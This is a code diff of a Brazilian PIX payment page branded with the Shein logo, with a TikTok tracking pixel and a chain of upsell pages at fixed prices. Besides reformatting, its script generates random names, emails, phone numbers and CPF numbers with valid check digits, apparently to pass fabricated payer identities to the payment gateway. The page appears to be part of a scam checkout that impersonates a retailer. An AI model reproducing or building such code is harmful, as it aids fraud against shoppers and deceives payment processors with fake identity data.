@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
-    <!-- TikTok Pixel Code Start -->
-    <script>
+  <!-- TikTok Pixel Code Start -->
+  <script>
     !(function (w, d, t) {
       w.TiktokAnalyticsObject = t;
       var ttq = (w[t] = w[t] || []);
@@ -48,30 +49,30 @@
             (ttq._o[e] = n || {});
           n = document.createElement("script");
           (n.type = "text/javascript"),
-          (n.async = !0),
-          (n.src = r + "?sdkid=" + e + "&lib=" + t);
+            (n.async = !0),
+            (n.src = r + "?sdkid=" + e + "&lib=" + t);
           e = document.getElementsByTagName("script")[0];
           e.parentNode.insertBefore(n, e);
         });
       ttq.load("D4L24BRC77UEBGID2NJ0");
-      ttq.ready(function() {
+      ttq.ready(function () {
         ttq.enableCookie();
         ttq.page();
       });
     })(window, document, "ttq");
   </script>
   <!-- TikTok Pixel Code End -->
-  
+
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Pagamento via PIX</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
-  <link href="css/all.min.css" rel="stylesheet" />
+  <link href="/checkout/css/all.min.css" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
   <!-- Alterando biblioteca QR code para qrcodejs -->
   <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
-  <link rel="stylesheet" href="css/css.css" />
+  <link rel="stylesheet" href="/checkout/css/css.css" />
 
   <style>
     .payment-status {
@@ -81,41 +82,48 @@
       border-radius: 8px;
       border-left: 4px solid #007bff;
     }
+
     .status-content {
       display: flex;
       align-items: center;
       gap: 15px;
     }
+
     .status-icon {
       font-size: 24px;
       color: #007bff;
     }
+
     .status-text {
       flex: 1;
     }
+
     .status-title {
       margin: 0;
       font-weight: 600;
       color: #333;
       font-size: 16px;
     }
+
     .status-subtitle {
       margin: 5px 0 0 0;
       font-size: 14px;
       color: #666;
     }
+
     .payment-status .fa-check-circle {
       color: #28a745;
     }
   </style>
 
-  <script src="js/utm-handler.js" data-token="7e8a9f18-33ef-4dc5-b96b-ab1a2dbb1e44" data-click-id-param="click_id"></script>
+  <script src="/checkout/js/utm-handler.js" data-token="7e8a9f18-33ef-4dc5-b96b-ab1a2dbb1e44"
+    data-click-id-param="click_id"></script>
 </head>
 
 <body>
   <header>
     <div class="container" style="padding:0">
-      <img src="images/shein-logo.png" alt="Logo Pagamento PIX" class="logo" />
+      <img src="/checkout/images/shein-logo.png" alt="Logo Pagamento PIX" class="logo" />
     </div>
   </header>
 
@@ -213,166 +221,166 @@
     // --- LÓGICA DE GERAÇÃO DE DADOS (PORTADO DO PHP) ---
 
     function gerarDígitoCPF(cpfParcial) {
-        let soma = 0;
-        let resto;
-        for (let i = 1; i <= cpfParcial.length; i++) {
-            soma = soma + parseInt(cpfParcial.substring(i - 1, i)) * (cpfParcial.length + 2 - i);
-        }
-        resto = (soma * 10) % 11;
-        if ((resto == 10) || (resto == 11)) resto = 0;
-        return resto;
+      let soma = 0;
+      let resto;
+      for (let i = 1; i <= cpfParcial.length; i++) {
+        soma = soma + parseInt(cpfParcial.substring(i - 1, i)) * (cpfParcial.length + 2 - i);
+      }
+      resto = (soma * 10) % 11;
+      if ((resto == 10) || (resto == 11)) resto = 0;
+      return resto;
     }
 
     function gerarCPF() {
-        let n1 = Math.floor(Math.random() * 10);
-        let n2 = Math.floor(Math.random() * 10);
-        let n3 = Math.floor(Math.random() * 10);
-        let n4 = Math.floor(Math.random() * 10);
-        let n5 = Math.floor(Math.random() * 10);
-        let n6 = Math.floor(Math.random() * 10);
-        let n7 = Math.floor(Math.random() * 10);
-        let n8 = Math.floor(Math.random() * 10);
-        let n9 = Math.floor(Math.random() * 10);
-        
-        // 9 primeiros dígitos
-        let cpf = `${n1}${n2}${n3}${n4}${n5}${n6}${n7}${n8}${n9}`;
-        
-        let d1 = gerarDígitoCPF(cpf);
-        let d2 = gerarDígitoCPF(cpf + d1);
-        
-        return `${cpf}${d1}${d2}`;
+      let n1 = Math.floor(Math.random() * 10);
+      let n2 = Math.floor(Math.random() * 10);
+      let n3 = Math.floor(Math.random() * 10);
+      let n4 = Math.floor(Math.random() * 10);
+      let n5 = Math.floor(Math.random() * 10);
+      let n6 = Math.floor(Math.random() * 10);
+      let n7 = Math.floor(Math.random() * 10);
+      let n8 = Math.floor(Math.random() * 10);
+      let n9 = Math.floor(Math.random() * 10);
+
+      // 9 primeiros dígitos
+      let cpf = `${n1}${n2}${n3}${n4}${n5}${n6}${n7}${n8}${n9}`;
+
+      let d1 = gerarDígitoCPF(cpf);
+      let d2 = gerarDígitoCPF(cpf + d1);
+
+      return `${cpf}${d1}${d2}`;
     }
 
     function gerarNomeAleatorio() {
-        const primeirosNomes = [
-            "Ana", "João", "Maria", "Carlos", "Lucas", "Sofia", "Pedro", "Fernanda", "Eduardo", 
-            "Isabela", "Gustavo", "Beatriz", "Ricardo", "Patrícia", "Roberto", "Juliana", 
-            "Felipe", "Larissa", "Thiago", "Julio", "Cláudia", "Vitor", "Bruna", "Renato", "Vanessa"
-        ];
-        const sobrenomes = [
-            "Silva", "Santos", "Oliveira", "Costa", "Pereira", "Almeida", "Martins", "Rodrigues", 
-            "Melo", "Dias", "Souza", "Nascimento", "Barbosa", "Araujo", "Cavalcanti", "Campos", 
-            "Pinto", "Lima", "Carvalho", "Gomes", "Ferreira", "Ribeiro", "Castro", "Mendes", 
-            "Azevedo", "Fernandes", "Morais", "Vieira", "Faria", "Pimentel"
-        ];
-        
-        const primeiroNome = primeirosNomes[Math.floor(Math.random() * primeirosNomes.length)];
-        const sobrenome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
-        let terceiroNome;
-        do {
-            terceiroNome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
-        } while (terceiroNome === sobrenome);
-        
-        return `${primeiroNome} ${sobrenome} ${terceiroNome}`;
+      const primeirosNomes = [
+        "Ana", "João", "Maria", "Carlos", "Lucas", "Sofia", "Pedro", "Fernanda", "Eduardo",
+        "Isabela", "Gustavo", "Beatriz", "Ricardo", "Patrícia", "Roberto", "Juliana",
+        "Felipe", "Larissa", "Thiago", "Julio", "Cláudia", "Vitor", "Bruna", "Renato", "Vanessa"
+      ];
+      const sobrenomes = [
+        "Silva", "Santos", "Oliveira", "Costa", "Pereira", "Almeida", "Martins", "Rodrigues",
+        "Melo", "Dias", "Souza", "Nascimento", "Barbosa", "Araujo", "Cavalcanti", "Campos",
+        "Pinto", "Lima", "Carvalho", "Gomes", "Ferreira", "Ribeiro", "Castro", "Mendes",
+        "Azevedo", "Fernandes", "Morais", "Vieira", "Faria", "Pimentel"
+      ];
+
+      const primeiroNome = primeirosNomes[Math.floor(Math.random() * primeirosNomes.length)];
+      const sobrenome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      let terceiroNome;
+      do {
+        terceiroNome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      } while (terceiroNome === sobrenome);
+
+      return `${primeiroNome} ${sobrenome} ${terceiroNome}`;
     }
 
     function gerarEmail(nomeCompleto) {
-        const nomeFormatado = nomeCompleto
-            .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remove acentos
-            .replace(/\s+/g, "") // Remove espaços
-            .toLowerCase();
-            
-        const dia = String(Math.floor(Math.random() * 31) + 1).padStart(2, '0');
-        const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
-        const dataNascimento = dia + mes;
-        
-        const domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@icloud.com"];
-        const dominio = domains[Math.floor(Math.random() * domains.length)];
-        
-        return `${nomeFormatado}${dataNascimento}${dominio}`;
+      const nomeFormatado = nomeCompleto
+        .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remove acentos
+        .replace(/\s+/g, "") // Remove espaços
+        .toLowerCase();
+
+      const dia = String(Math.floor(Math.random() * 31) + 1).padStart(2, '0');
+      const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+      const dataNascimento = dia + mes;
+
+      const domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@icloud.com"];
+      const dominio = domains[Math.floor(Math.random() * domains.length)];
+
+      return `${nomeFormatado}${dataNascimento}${dominio}`;
     }
 
     function gerarTelefone() {
-        const ddd = Math.floor(Math.random() * (99 - 11 + 1)) + 11;
-        const comDigito9 = Math.random() < 0.5;
-        const numeroBase = Math.floor(Math.random() * 90000000) + 10000000;
-        
-        if (comDigito9) {
-            return `${ddd}9${numeroBase}`;
-        } else {
-            return `${ddd}${numeroBase}`;
-        }
+      const ddd = Math.floor(Math.random() * (99 - 11 + 1)) + 11;
+      const comDigito9 = Math.random() < 0.5;
+      const numeroBase = Math.floor(Math.random() * 90000000) + 10000000;
+
+      if (comDigito9) {
+        return `${ddd}9${numeroBase}`;
+      } else {
+        return `${ddd}${numeroBase}`;
+      }
     }
 
     // --- LÓGICA DE CONFIGURAÇÃO (PORTADO DE nlo-config.php) ---
-    
-    function getConfiguracao() {
-        const urlParams = new URLSearchParams(window.location.search);
-        let up = urlParams.get('up');
-        
-        let upsellUrl = "../up1";
-        let valor = "36.72";
-        let front = true;
 
-        if (up) {
-            const upInt = parseInt(up);
-            switch(upInt) {
-                case 1:
-                    upsellUrl = "../up2";
-                    valor = "20.64";
-                    front = false;
-                    break;
-                case 2:
-                    upsellUrl = "../up3";
-                    valor = "27.90";
-                    front = false;
-                    break;
-                case 3:
-                    upsellUrl = "../up4";
-                    valor = "21.56";
-                    front = false;
-                    break;
-                case 4:
-                    upsellUrl = "../up5";
-                    valor = "22.30";
-                    front = false;
-                    break;
-                case 5:
-                    upsellUrl = "../up6";
-                    valor = "43.94";
-                    front = false;
-                    break;
-                case 6:
-                    upsellUrl = "../up2";
-                    valor = "17.50";
-                    front = false;
-                    break;
-                default:
-                    front = true;
-                    break;
-            }
+    function getConfiguracao() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let up = urlParams.get('up');
+
+      let upsellUrl = "../up1";
+      let valor = "36.72";
+      let front = true;
+
+      if (up) {
+        const upInt = parseInt(up);
+        switch (upInt) {
+          case 1:
+            upsellUrl = "../up2";
+            valor = "20.64";
+            front = false;
+            break;
+          case 2:
+            upsellUrl = "../up3";
+            valor = "27.90";
+            front = false;
+            break;
+          case 3:
+            upsellUrl = "../up4";
+            valor = "21.56";
+            front = false;
+            break;
+          case 4:
+            upsellUrl = "../up5";
+            valor = "22.30";
+            front = false;
+            break;
+          case 5:
+            upsellUrl = "../up6";
+            valor = "43.94";
+            front = false;
+            break;
+          case 6:
+            upsellUrl = "../up2";
+            valor = "17.50";
+            front = false;
+            break;
+          default:
+            front = true;
+            break;
         }
-        
-        return {
-            upsellUrl: upsellUrl,
-            valor: parseFloat(valor),
-            oferta: "tiktok", // valor fixo usado no PHP
-            up: up
-        };
+      }
+
+      return {
+        upsellUrl: upsellUrl,
+        valor: parseFloat(valor),
+        oferta: "tiktok", // valor fixo usado no PHP
+        up: up
+      };
     }
 
     // --- VARIÁVEIS GLOBAIS ---
-    
+
     const config = getConfiguracao();
     const nomeCompleto = gerarNomeAleatorio();
     const emailGerado = gerarEmail(nomeCompleto);
     const cpfGerado = gerarCPF();
     const telefoneGerado = gerarTelefone();
-    
+
     // Atualiza o valor na interface
     const valorFormatado = config.valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
     document.getElementById('amount').textContent = valorFormatado;
 
     let id_transacao = "";
-    
+
     // --- LÓGICA DE GERAÇÃO E VERIFICAÇÃO DE PIX ---
 
     function gerarPix() {
       const params = new URLSearchParams(window.location.search);
-      
+
       params.delete("valor");
       params.delete("up");
-      
+
       const utmString = params.toString() || "utm_source=direct";
 
       const formData = {
@@ -482,7 +490,7 @@
         const pixCodeInput = document.getElementById("pix-code");
         pixCodeInput.select();
         pixCodeInput.setSelectionRange(0, 99999);
-        
+
         // Tenta usar a API moderna de clipboard
         if (navigator.clipboard && window.isSecureContext) {
           navigator.clipboard.writeText(pixCodeInput.value).then(() => {
@@ -539,7 +547,7 @@
           .then((data) => {
             console.log("🔍 Status do pagamento:", data);
             const status = data?.status?.toLowerCase();
-            
+
             if (status === "approved" || status === "completed") {
               return true;
             }
@@ -604,7 +612,7 @@
       // Redireciona para o upsell preservando parâmetros UTM
       const upsell = new URL(config.upsellUrl, window.location.href);
       const currentParams = new URLSearchParams(window.location.search);
-      
+
       for (const [key, value] of currentParams.entries()) {
         if (!upsell.searchParams.has(key)) {
           upsell.searchParams.set(key, value);
@@ -630,4 +638,5 @@
     });
   </script>
 </body>
+
 </html>
